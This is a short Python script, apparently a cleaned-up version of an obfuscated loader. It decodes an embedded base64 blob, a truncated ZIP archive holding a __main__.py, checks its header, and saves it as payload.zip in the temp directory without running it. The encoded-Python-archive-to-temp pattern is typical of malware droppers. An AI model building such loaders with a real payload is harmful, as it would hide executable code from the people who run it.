import os
import sys
import base64
import tempfile

# Short aliases (not recommended, but kept for similarity)
A = chr
B = ''
E = ' '

# Encoded payload (truncated in your message → likely broken)
J = """UEsDBBQAAAAIABtrWFkTiBq4rAIAAP4FAAALABwAX19tYWluX18ucHlVVAkAA6VKGmelShpndXgLAAEEAAAAAAQAAAAA...
"""

def decode_payload(data):
    try:
        return base64.b64decode(data)
    except Exception as e:
        print("Decoding failed:", e)
        return None

def save_to_temp(decoded_data):
    if not decoded_data:
        print("No data to save.")
        return None

    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, "payload.zip")

    with open(file_path, "wb") as f:
        f.write(decoded_data)

    print("Saved to:", file_path)
    return file_path


if __name__ == "__main__":
    decoded = decode_payload(J)

    if decoded:
        # Check if it's a ZIP (PK header)
        if decoded[:2] == b'PK':
            print("Looks like a ZIP file.")
        else:
            print("Not a ZIP file or corrupted.")

        save_to_temp(decoded)
